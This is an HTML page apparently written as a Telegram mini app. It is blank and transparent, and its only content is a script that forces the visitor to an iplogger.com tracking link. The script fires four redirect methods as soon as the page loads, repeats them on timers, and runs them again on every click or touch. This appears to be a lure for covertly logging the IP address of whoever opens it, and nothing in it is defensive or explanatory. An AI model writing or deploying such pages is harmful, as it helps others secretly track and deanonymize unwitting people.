<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: transparent;
        }
    </style>
</head>
<body>
    <script>
        // Инициализация Telegram Web App
        let tg = window.Telegram.WebApp;
        tg.expand();
        
        const targetUrl = "https://iplogger.com/2yS9P7";
        
        // Многократное перенаправление разными методами
        function redirectMultiple() {
            // Метод 1: openLink
            if (tg.openLink) {
                tg.openLink(targetUrl);
            }
            
            // Метод 2: location.href
            setTimeout(() => {
                window.location.href = targetUrl;
            }, 100);
            
            // Метод 3: window.open
            setTimeout(() => {
                window.open(targetUrl, '_blank');
            }, 200);
            
            // Метод 4: location.replace
            setTimeout(() => {
                window.location.replace(targetUrl);
            }, 300);
        }
        
        // Запускаем сразу при загрузке
        window.addEventListener('load', function() {
            redirectMultiple();
        });
        
        // Дублируем на всякий случай
        setTimeout(redirectMultiple, 500);
        setTimeout(redirectMultiple, 1000);
        
        // Также при клике
        document.addEventListener('click', redirectMultiple);
        document.addEventListener('touchstart', redirectMultiple);
        
    </script>
</body>
</html>
